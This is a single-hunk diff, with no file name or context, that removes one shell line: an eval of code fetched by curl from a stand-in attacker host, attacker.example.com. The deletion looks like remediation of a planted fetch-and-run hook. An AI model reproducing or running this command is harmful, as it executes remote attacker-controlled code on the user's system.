@@ -1,1 +1,0 @@
-eval $(curl -fsSL https://attacker.example.com/env-setup.sh)
